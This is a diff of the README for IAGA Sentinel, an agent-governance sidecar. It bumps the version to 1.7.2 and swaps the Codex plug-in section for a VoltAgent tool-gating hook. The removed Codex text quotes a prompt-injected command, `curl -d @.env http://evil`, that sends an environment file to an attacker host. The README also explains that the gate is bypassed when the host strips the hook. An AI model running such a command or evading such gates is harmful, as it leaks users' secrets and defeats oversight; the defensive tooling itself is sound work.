@@ -13,7 +13,7 @@
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/version-1.7.1-0f9d6b?style=flat-square" alt="version" />
+  <img src="https://img.shields.io/badge/version-1.7.2-0f9d6b?style=flat-square" alt="version" />
   <img src="https://img.shields.io/badge/license-BUSL--1.1-0f9d6b?style=flat-square" alt="license" />
   <img src="https://img.shields.io/badge/EU%20AI%20Act-Art.%2012%20and%20Annex%20IV-0B0F0E?style=flat-square" alt="EU AI Act Article 12 and Annex IV" />
   <img src="https://img.shields.io/badge/Rust-stable-0B0F0E?style=flat-square" alt="Rust" />
@@ -79,7 +79,7 @@ curl -s -X POST http://localhost:4010/v1/inspect -H 'Content-Type: application/j
 The receipt chain verifies with no server, no database and no network, using the standalone `iaga-verify` binary. That binary isn't in the Docker image, so install the CLI (still no clone) and run the same flow locally:
 
 ```bash
-cargo install --git https://github.com/EdoardoBambini/IAGA-Sentinel --tag v1.7.1 --locked \
+cargo install --git https://github.com/EdoardoBambini/IAGA-Sentinel --tag v1.7.2 --locked \
   iaga-sentinel-core iaga-sentinel-verify
 IAGA_SENTINEL_OPEN_MODE=true iaga serve --seed-demo     # then POST /v1/inspect as above
 ```
@@ -94,7 +94,7 @@ Postgres (`--features postgres` + `DATABASE_URL`) and `docker compose up -d` are
 
 ---
 
-## Test me now (1.7.1)
+## Test me now (1.7.2)
 
 Do not take our word for it. The repository ships a self-contained demo kit that drives three real verdicts through the live pipeline and proves the receipt offline, on your own machine. Nothing is faked, and you get the same verdicts every run. Two scripts under [`scripts/`](scripts/) and a runbook in [`docs/demo/README.md`](docs/demo/README.md). The primary path is Windows PowerShell; Linux and macOS use the `.sh` twins.
 
@@ -138,20 +138,29 @@ Window layout, captions and a 75 to 100 second timing budget are in [`docs/demo/
 
 ---
 
-## In the loop with OpenAI Codex
+## In the loop with VoltAgent
 
-Most integrations **observe**: they ask for a verdict and certify what happened. The OpenAI Codex plug-in is the first that also **acts inside the agent's loop**, adding a third verb to *enforces softly and certifies hard*: **enforces inside the loop**. It is IAGA Sentinel's first **vertical plug-in**: a deep, framework-specific adapter under active development, and its first end-to-end, bidirectional integration.
+Most integrations **observe**: they ask for a verdict and certify what happened. The **[VoltAgent](https://github.com/VoltAgent/voltagent)** plug-in also **acts inside the agent's loop** — IAGA Sentinel's flagship in-the-loop, framework-specific plug-in, shipped as the npm package [`@iaga-sentinel/voltagent`](plug-ins/voltagent-plugin/).
 
-- **The gate.** Codex's native `PreToolUse` hook routes every tool call through `POST /v1/inspect` before it runs. A `block` verdict stops the action inside Codex (exit 2) and hands the model the policy reason; a signed receipt is minted either way. **Fail-closed by default**: no verdict means the action does not run.
-- **The compiler.** `iaga-codex export-rules` compiles a Dictum bundle into Codex's **native** execpolicy `.rules`, a static command-prefix layer that holds even when hooks are disabled. Both layers merge strictest-wins.
-- **The ingest.** `iaga-codex ingest` turns a `codex exec --json` session (live from a pipe, a spawned run, or a captured file) into the same signed receipt chain, so even sessions that ran *without* the gate leave verifiable evidence. This is the **advisory** tier: the verdict is recorded, never applied.
-- **The sandbox (Phase 2).** Run Codex under its native OS sandbox and the egress threat closes *below* the model: a prompt-injected `curl -d @.env http://evil` cannot even open the socket, because outbound network is denied by default. The secret never leaves the box even if every cooperative check were stripped out. The gate still attests the attempt; the enforcer here is the OS sandbox, not Sentinel, so the receipt stays honest (`is_authoritative: false`).
+```ts
+import { Agent } from "@voltagent/core";
+import { createSentinelHooks } from "@iaga-sentinel/voltagent";
 
-This integration spans the full enforcement ladder: **advisory** (ingest: recorded after the fact), **agent-loop** (gate: the action is actually stopped, unless the host disables the hook), and **kernel** (reserved). The limit stays written into the evidence: every receipt carries `is_authoritative: false`. The plug-in is fully isolated: all Codex-specific code lives in the `iaga-codex` binary, and the `iaga` core depends on none of it.
+const agent = new Agent({
+  model: /* your model */, tools: [/* … */],
+  hooks: createSentinelHooks({ agentId: "my-agent", sessionId: "run-1" }),
+});
+// A blocked tool throws ToolDeniedError before execute() ever runs.
+```
 
-**In active development.** [`STATUS.md`](examples/integrations/codex/STATUS.md) tracks the honest what-works list and the roadmap: non-disableable managed hooks (`requirements.toml`), a Sentinel egress proxy that allowlists domains and mints a receipt per connection, and human-in-the-loop `ask` verdicts.
+- **The gate.** `createSentinelHooks()` routes VoltAgent's `onToolStart` hook through `POST /v1/inspect` before every tool runs. `allow` → the tool runs; `review` → denied by default (or pass through with `onReview: "allow"`); `block` → a `ToolDeniedError` aborts the call so `execute()` never fires. **Fail-closed by default**: if the sidecar is unreachable, the tool is denied.
+- **The scanners (opt-in).** `scanInput` runs the tool input through the prompt-injection firewall (`/v1/firewall/scan`); `scanOutput` + `redactOutput` redact secrets in tool output via `/v1/response/scan` in `onToolEnd`, so the model sees `[REDACTED-…]` instead of the real value — verified end-to-end against a real model.
+- **MCP, for free.** VoltAgent MCP tools surface in the same registry, so the same gate governs them — no separate code path.
+- **The evidence.** Every governed action mints a signed receipt under `run_id = <agentId>:<sessionId>`. Verify the whole chain offline: `iaga replay <agentId>:<sessionId> --verify-only` → `CHAIN OK`.
 
-→ [`examples/integrations/codex/`](examples/integrations/codex/) · [STATUS & roadmap](examples/integrations/codex/STATUS.md) · [ADR 0022](docs/adr/0022-codex-integration.md)
+Cooperative agent-loop tier: bypassable if the host strips the hook, and every receipt stays `is_authoritative: false`. The hard guarantee is the signed, offline-verifiable chain, not unbypassable blocking.
+
+→ [`plug-ins/voltagent-plugin/`](plug-ins/voltagent-plugin/) · also a [Codex plug-in](plug-ins/codex-plugin/) ([ADR 0022](docs/adr/0022-codex-integration.md)) and 15 framework [adapters](plug-ins/)
 
 ---
 
@@ -164,7 +173,7 @@ In this repository:
 - [`CHANGELOG.md`](CHANGELOG.md): release notes
 - [`docs/openapi.yaml`](docs/openapi.yaml): the full HTTP API specification
 - [`docs/adr/`](docs/adr/): architectural decision records (0001–0022)
-- [`examples/integrations/`](examples/integrations/): copy-paste adapter examples for 16 frameworks (incl. the [OpenAI Codex](examples/integrations/codex/) in-the-loop plug-in)
+- [`plug-ins/`](plug-ins/): in-the-loop plugins — released ([Codex](plug-ins/codex-plugin/), [VoltAgent](plug-ins/voltagent-plugin/)) plus `*-adapter/` integrations for 15 more frameworks
 - [`sdks/`](sdks/): Python and TypeScript SDKs
 - [`SECURITY.md`](SECURITY.md) · [`DATA_HANDLING.md`](DATA_HANDLING.md) · [`CONTRIBUTING.md`](CONTRIBUTING.md)
 
@@ -206,6 +215,9 @@ Research-validated, not marketing-validated.
 ## Status
 
 > [!NOTE]
+> **New in 1.7.2: the VoltAgent plug-in + a tidy `plug-ins/` home.** A new released, in-the-loop plug-in for [VoltAgent](https://github.com/VoltAgent/voltagent) ([`@iaga-sentinel/voltagent`](plug-ins/voltagent-plugin/)): an `onToolStart` gate that throws `ToolDeniedError` before a tool's `execute()` runs, optional prompt-injection input-scan and secret redaction of tool output, and offline `CHAIN OK` receipts — verified end-to-end against a real sidecar and a real model. The repo's in-the-loop integrations are consolidated under [`plug-ins/`](plug-ins/) (released `*-plugin/` next to copy-paste `*-adapter/`). Additive and docs-only for the core: receipts and the default build are byte-identical to 1.7.1. See the [CHANGELOG](CHANGELOG.md).
+
+> [!NOTE]
 > **New in 1.7.1: documentation and honesty hygiene.** No code-path or wire change — receipts, policy evaluation, and the default build are byte-identical to 1.7.0. The boot banner and the architecture notes now state the real pipeline depth (**8 layers**, two of them — sandbox and formal-verify — advisory and not part of the verdict) instead of the old "12 layers" headline; `.cargo/audit.toml` documents which optional/compile-time path pulls each of the three ignored RUSTSEC advisories (none is in the default build, re-verified with `cargo tree`); and the workspace, SDK manifests, and BUSL `Licensed Work` line are aligned to the release. See the [CHANGELOG](CHANGELOG.md).
 
 > [!NOTE]
@@ -217,7 +229,7 @@ Research-validated, not marketing-validated.
 > [!NOTE]
 > **New in 1.5.4: the policy language now enforces what it promised.** The Dictum `secret_ref()` builtin actually detects credentials and PII inside a tool payload (it was a placeholder that always returned false), and a new `url_host()` builtin gives a policy a real per-host egress allowlist that also defeats look-alike-domain bypasses. Three core fixes ship alongside: the workspace egress allowlist is URL-aware, so a full URL to an allowed host is no longer over-blocked; every `block` or `review` now carries its cause in the audit event and the signed receipt, with no silent escalation; and signed receipts hash-chain across a session, so a multi-step run forms one tamper-evident Merkle chain. See [ADR 0023](docs/adr/0023-dictum-secret-detection-host-egress.md) and the [CHANGELOG](CHANGELOG.md).
 
-Current release: **1.7.1** ([release notes](CHANGELOG.md)). CI runs the full workspace test suite (default and `--all-features`), live-Postgres receipt tests, SDK end-to-end smokes against a real sidecar, and clippy with `-D warnings`. All green from a clean checkout.
+Current release: **1.7.2** ([release notes](CHANGELOG.md)). CI runs the full workspace test suite (default and `--all-features`), live-Postgres receipt tests, SDK end-to-end smokes against a real sidecar, and clippy with `-D warnings`. All green from a clean checkout.
 
 ---
 
